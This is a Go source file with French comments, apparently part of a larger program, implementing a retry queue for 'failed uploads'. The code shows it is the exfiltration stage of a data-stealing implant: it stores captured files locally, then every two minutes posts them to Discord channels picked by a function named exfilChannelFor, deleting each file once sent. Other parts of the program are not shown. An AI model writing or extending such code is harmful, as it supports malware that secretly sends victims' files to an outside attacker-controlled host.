// queue.go — file d'attente des envois ratés.
//
// Un envoi peut échouer (coupure, limite de débit, redémarrage). Sans file
// d'attente, le fichier était perdu. Chaque échec est écrit dans
// `workDir/queue/` avec son nom, et une tâche repasse toutes les 2 minutes
// pour le pousser.
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"
)

const queueMaxFiles = 200

var queueMu sync.Mutex

func queueDir() string {
	d := filepath.Join(workDir(), "queue")
	_ = os.MkdirAll(d, 0700)
	return d
}

// queueFile met un fichier en attente. Le nom d'origine est conservé après un
// préfixe horodaté, pour éviter les collisions.
func queueFile(name string, data []byte) {
	if len(data) == 0 {
		return
	}
	queueMu.Lock()
	defer queueMu.Unlock()

	entries, _ := os.ReadDir(queueDir())
	if len(entries) >= queueMaxFiles {
		// File pleine : on retire les plus anciens plutôt que de grossir sans
		// fin sur un poste qui n'a plus de réseau.
		sort.Slice(entries, func(i, j int) bool { return entries[i].Name() < entries[j].Name() })
		for i := 0; i < len(entries)-queueMaxFiles+1; i++ {
			_ = os.Remove(filepath.Join(queueDir(), entries[i].Name()))
		}
	}
	safe := strings.ReplaceAll(filepath.Base(name), string(os.PathSeparator), "_")
	p := filepath.Join(queueDir(), time.Now().Format("20060102-150405.000")+"_"+safe)
	_ = os.WriteFile(p, data, 0600)
}

// flushQueue retente les envois en attente. Rend le nombre de fichiers poussés.
func flushQueue() int {
	queueMu.Lock()
	defer queueMu.Unlock()

	entries, err := os.ReadDir(queueDir())
	if err != nil {
		return 0
	}
	sent := 0
	for _, e := range entries {
		if e.IsDir() || stopped.Load() {
			continue
		}
		p := filepath.Join(queueDir(), e.Name())
		data, rerr := os.ReadFile(p)
		if rerr != nil {
			continue
		}
		name := e.Name()
		if i := strings.Index(name, "_"); i >= 0 {
			name = name[i+1:]
		}
		ch := exfilChannelFor(name)
		if ch == "" {
			continue
		}
		if !postMultipart(discordAPI+fmt.Sprintf("/channels/%s/messages", ch), true, fileOut{Name: name, Data: data}) {
			continue // toujours hors ligne : on garde le fichier
		}
		_ = os.Remove(p)
		sent++
		time.Sleep(400 * time.Millisecond)
	}
	if sent > 0 {
		plog("file d'attente : " + itoa64(int64(sent)) + " fichier(s) renvoyé(s)")
	}
	return sent
}

// queueLoop vide la file toutes les 2 minutes.
func queueLoop() {
	for {
		time.Sleep(2 * time.Minute)
		if stopped.Load() {
			return
		}
		flushQueue()
	}
}
